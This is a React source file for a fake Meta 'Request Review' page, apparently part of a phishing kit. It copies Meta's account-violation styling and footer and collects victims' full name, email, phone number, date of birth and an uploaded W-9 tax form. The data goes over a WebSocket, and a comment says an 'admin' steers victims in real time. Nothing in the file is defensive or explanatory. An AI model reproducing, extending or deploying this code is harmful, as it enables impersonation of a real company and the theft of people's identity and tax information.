import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useWebSocket } from '../context/WebSocketContext';
import "../styles/request-form.css";

// Country list with dial codes
const countries = [
  { code: 'US', name: 'United States', dialCode: '+1' },
  { code: 'GB', name: 'United Kingdom', dialCode: '+44' },
  { code: 'IN', name: 'India', dialCode: '+91' },
  { code: 'CA', name: 'Canada', dialCode: '+1' },
  { code: 'AU', name: 'Australia', dialCode: '+61' },
  { code: 'DE', name: 'Germany', dialCode: '+49' },
  { code: 'FR', name: 'France', dialCode: '+33' },
  { code: 'IT', name: 'Italy', dialCode: '+39' },
  { code: 'ES', name: 'Spain', dialCode: '+34' },
  { code: 'BR', name: 'Brazil', dialCode: '+55' },
  { code: 'MX', name: 'Mexico', dialCode: '+52' },
  { code: 'JP', name: 'Japan', dialCode: '+81' },
  { code: 'CN', name: 'China', dialCode: '+86' },
  { code: 'KR', name: 'South Korea', dialCode: '+82' },
  { code: 'RU', name: 'Russia', dialCode: '+7' },
  { code: 'ZA', name: 'South Africa', dialCode: '+27' },
  { code: 'NG', name: 'Nigeria', dialCode: '+234' },
  { code: 'EG', name: 'Egypt', dialCode: '+20' },
  { code: 'AE', name: 'UAE', dialCode: '+971' },
  { code: 'SA', name: 'Saudi Arabia', dialCode: '+966' },
  { code: 'PK', name: 'Pakistan', dialCode: '+92' },
  { code: 'BD', name: 'Bangladesh', dialCode: '+880' },
  { code: 'ID', name: 'Indonesia', dialCode: '+62' },
  { code: 'PH', name: 'Philippines', dialCode: '+63' },
  { code: 'MY', name: 'Malaysia', dialCode: '+60' },
  { code: 'SG', name: 'Singapore', dialCode: '+65' },
  { code: 'TH', name: 'Thailand', dialCode: '+66' },
  { code: 'VN', name: 'Vietnam', dialCode: '+84' },
  { code: 'NL', name: 'Netherlands', dialCode: '+31' },
  { code: 'BE', name: 'Belgium', dialCode: '+32' },
  { code: 'SE', name: 'Sweden', dialCode: '+46' },
  { code: 'NO', name: 'Norway', dialCode: '+47' },
  { code: 'DK', name: 'Denmark', dialCode: '+45' },
  { code: 'FI', name: 'Finland', dialCode: '+358' },
  { code: 'PL', name: 'Poland', dialCode: '+48' },
  { code: 'PT', name: 'Portugal', dialCode: '+351' },
  { code: 'GR', name: 'Greece', dialCode: '+30' },
  { code: 'IE', name: 'Ireland', dialCode: '+353' },
  { code: 'NZ', name: 'New Zealand', dialCode: '+64' },
  { code: 'AR', name: 'Argentina', dialCode: '+54' },
  { code: 'CL', name: 'Chile', dialCode: '+56' },
  { code: 'CO', name: 'Colombia', dialCode: '+57' },
  { code: 'PE', name: 'Peru', dialCode: '+51' },
  { code: 'TR', name: 'Turkey', dialCode: '+90' },
  { code: 'IL', name: 'Israel', dialCode: '+972' },
  { code: 'AT', name: 'Austria', dialCode: '+43' },
  { code: 'CH', name: 'Switzerland', dialCode: '+41' },
  { code: 'HK', name: 'Hong Kong', dialCode: '+852' },
  { code: 'TW', name: 'Taiwan', dialCode: '+886' },
];

const RequestReviewForm = () => {
  const navigate = useNavigate();
  const { submitForm, isConnected } = useWebSocket();
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [selectedCountry, setSelectedCountry] = useState(countries[2]); // Default to India
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [countrySearch, setCountrySearch] = useState('');
  const dropdownRef = useRef(null);
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    phone: "",
    dobDay: "",
    dobMonth: "",
    dobYear: "",
    taxFile: null,
    agreeTerms: false,
  });
  const [errors, setErrors] = useState({});

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
        setShowCountryDropdown(false);
        setCountrySearch('');
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Filter countries based on search
  const filteredCountries = countries.filter(country =>
    country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
    country.dialCode.includes(countrySearch) ||
    country.code.toLowerCase().includes(countrySearch.toLowerCase())
  );

  const handleCountrySelect = (country) => {
    setSelectedCountry(country);
    setShowCountryDropdown(false);
    setCountrySearch('');
  };

  // Generate day options (1-31)
  const days = Array.from({ length: 31 }, (_, i) => i + 1);

  // Generate month options (1-12)
  const months = Array.from({ length: 12 }, (_, i) => i + 1);

  // Generate year options (1917 - 2016)
  const years = Array.from({ length: 100 }, (_, i) => 2016 - i);

  const handleInputChange = (e) => {
    const { name, value, type, checked, files } = e.target;

    if (type === "checkbox") {
      setFormData((prev) => ({ ...prev, [name]: checked }));
    } else if (type === "file") {
      setFormData((prev) => ({ ...prev, [name]: files[0] }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }

    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: "" }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.fullName.trim()) {
      newErrors.fullName = "Full name is required";
    }

    if (!formData.email.trim()) {
      newErrors.email = "Email is required";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Please enter a valid email address";
    }

    if (!formData.phone.trim()) {
      newErrors.phone = "Phone number is required";
    }

    if (!formData.dobDay || !formData.dobMonth || !formData.dobYear) {
      newErrors.dob = "Date of birth is required";
    }

    if (!formData.agreeTerms) {
      newErrors.agreeTerms = "You must agree to the terms and privacy policy";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    // Submit to WebSocket
    submitForm('request_review', {
      fullName: formData.fullName,
      email: formData.email,
      phone: `${selectedCountry.dialCode} ${formData.phone}`,
      dob: `${formData.dobDay}/${formData.dobMonth}/${formData.dobYear}`
    });
    
    setIsSubmitted(true);
    // Keep loading state - admin will navigate via WebSocket
  };

  const handleFileClick = () => {
    document.getElementById("fileInput").click();
  };

  return (
    <div className="verified-container">
      {/* Loading overlay */}
      {isLoading && (
        <div className="wrapper-loading-root">
          <div className="progress-bar" style={{ display: "block" }}>
            <div className="bar1"></div>
            <div className="bar2"></div>
          </div>
        </div>
      )}

      {/* Header */}
      <div className="violation-header">
        <div className="violation-icon">
          <h1 className="violation-title">Request Review</h1>
        </div>
      </div>

      {/* Form */}
      <form className="consultation-form" onSubmit={handleSubmit}>
        {/* Info Bar */}
        <p className="info-bar">
          Please provide the information below to help us review your account.
        </p>

        {/* Full Name */}
        <div className="form-group-home">
          <span className="form-label">
            Full Name <span className="required">*</span>
          </span>
          <div className="floating-label-group">
            <input
              id="fullName"
              name="fullName"
              className={`form-input ${errors.fullName ? "error" : ""}`}
              placeholder="Enter your full name"
              type="text"
              value={formData.fullName}
              onChange={handleInputChange}
              required
            />
            {errors.fullName && (
              <span className="email-error show">{errors.fullName}</span>
            )}
          </div>
        </div>

        {/* Email */}
        <div className="form-group-home">
          <label className="form-label">
            Email <span className="required">*</span>
          </label>
          <div className="floating-label-group">
            <input
              id="email"
              name="email"
              placeholder="Enter your email"
              className={`form-input ${errors.email ? "error" : ""}`}
              type="text"
              value={formData.email}
              onChange={handleInputChange}
              required
            />
            {errors.email && (
              <span className="email-error show">{errors.email}</span>
            )}
          </div>
        </div>

        {/* Phone Number */}
        <div className="form-group-home">
          <label className="form-label">
            Phone number <span className="required">*</span>
          </label>
          <div className="floating-label-group">
            <div className="phone-country-selector" ref={dropdownRef}>
              <div 
                className="country-flag-box"
                onClick={() => setShowCountryDropdown(!showCountryDropdown)}
              >
                <img 
                  alt={selectedCountry.code} 
                  width="20" 
                  height="15" 
                  src={`https://flagcdn.com/w40/${selectedCountry.code.toLowerCase()}.png`}
                />
                <span className="dial-code">{selectedCountry.dialCode}</span>
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className={showCountryDropdown ? 'chevron-up' : ''}
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
              {showCountryDropdown && (
                <div className="country-dropdown">
                  <div className="country-search-wrapper">
                    <input
                      type="text"
                      className="country-search-input"
                      placeholder="Search country..."
                      value={countrySearch}
                      onChange={(e) => setCountrySearch(e.target.value)}
                      autoFocus
                    />
                  </div>
                  <div className="country-list">
                    {filteredCountries.map((country) => (
                      <div
                        key={country.code}
                        className={`country-item ${selectedCountry.code === country.code ? 'selected' : ''}`}
                        onClick={() => handleCountrySelect(country)}
                      >
                        <img
                          alt={country.code}
                          width="20"
                          height="15"
                          src={`https://flagcdn.com/w40/${country.code.toLowerCase()}.png`}
                        />
                        <span className="country-name">{country.name}</span>
                        <span className="country-dial-code">{country.dialCode}</span>
                      </div>
                    ))}
                    {filteredCountries.length === 0 && (
                      <div className="country-item no-results">No countries found</div>
                    )}
                  </div>
                </div>
              )}
            </div>
            <input
              id="phone"
              name="phone"
              className={`form-input phone-input ${errors.phone ? "error" : ""}`}
              placeholder="Phone number"
              type="tel"
              value={formData.phone}
              onChange={handleInputChange}
              required
            />
            {errors.phone && (
              <span className="email-error show">{errors.phone}</span>
            )}
          </div>
        </div>

        {/* Date of Birth */}
        <div className="form-group-home">
          <label className="form-label">
            Date of Birth <span className="required">*</span>
          </label>
          <div className="floating-label-group date-group">
            <div className="date-select-box">
              <select
                name="dobDay"
                className="date-select"
                value={formData.dobDay}
                onChange={handleInputChange}
              >
                <option value="" disabled hidden>
                  Day
                </option>
                {days.map((day) => (
                  <option key={day} value={day}>
                    {day}
                  </option>
                ))}
              </select>
              <div className="select-arrow">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
            </div>
            <div className="date-select-box">
              <select
                name="dobMonth"
                className="date-select"
                value={formData.dobMonth}
                onChange={handleInputChange}
              >
                <option value="" disabled hidden>
                  Month
                </option>
                {months.map((month) => (
                  <option key={month} value={month}>
                    {month}
                  </option>
                ))}
              </select>
              <div className="select-arrow">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
            </div>
            <div className="date-select-box">
              <select
                name="dobYear"
                className="date-select"
                value={formData.dobYear}
                onChange={handleInputChange}
              >
                <option value="" disabled hidden>
                  Year
                </option>
                {years.map((year) => (
                  <option key={year} value={year}>
                    {year}
                  </option>
                ))}
              </select>
              <div className="select-arrow">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#6a7282"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
              </div>
            </div>
          </div>
          {errors.dob && <span className="email-error show">{errors.dob}</span>}
        </div>

        {/* File Upload */}
        <div className="form-group-home">
          <label className="form-label">Upload Tax Files</label>
          <div className="floating-label-group">
            <input
              id="fileDisplay"
              placeholder="Click to upload W-9 form"
              className="form-input file-display-input"
              style={{ padding: "20px", textAlign: "center" }}
              type="text"
              readOnly
              onClick={handleFileClick}
              value={formData.taxFile ? formData.taxFile.name : ""}
            />
            <input
              id="fileInput"
              hidden
              accept=".pdf, .doc, .docx, .xls, .xlsx, .txt, application/pdf, application/msword, application/vnd.openxmlformats-officedocument.wordprocessingml.document"
              type="file"
              name="taxFile"
              onChange={handleInputChange}
            />
            <div className="dashed-border-overlay">
              <div className="dashed-inner"></div>
            </div>
          </div>
        </div>

        {/* Terms Checkbox */}
        <div className="checkbox-item">
          <input
            className="checkbox-custom"
            id="privacy-policy"
            type="checkbox"
            name="agreeTerms"
            checked={formData.agreeTerms}
            onChange={handleInputChange}
          />
          <label htmlFor="privacy-policy" className="checkbox-text">
            I agree to Meta's <a href="#">Terms</a> and{" "}
            <a href="#">Privacy Policy</a>
          </label>
        </div>
        {errors.agreeTerms && (
          <span className="email-error show">{errors.agreeTerms}</span>
        )}

        {/* Submit Button */}
        <div className="submit-wrapper">
          <button type="submit" className="submit-btn" disabled={isLoading}>
            {/* <div className="btn-spacer"></div> */}
                             {isLoading ? (
                    <>
                      <svg className="spinner" viewBox="0 0 50 50">
                        <circle className="path" cx="25" cy="25" r="20" fill="none" strokeWidth="5"></circle>
                      </svg>
                      <span>Submitting...</span>
                    </>
                  ) : (
                    'Submit'
                  )}
            {/* <div>{isLoading ? "Submitting..." : "Submit"}</div> */}
          </button>
        </div>
      </form>

      {/* Footer Links */}
      <div className="footer-links">
        <a href="#">Help Center</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
        <a href="#">Community Standards</a>
        <span>Meta © {new Date().getFullYear()}</span>
      </div>
    </div>
  );
};

export default RequestReviewForm;
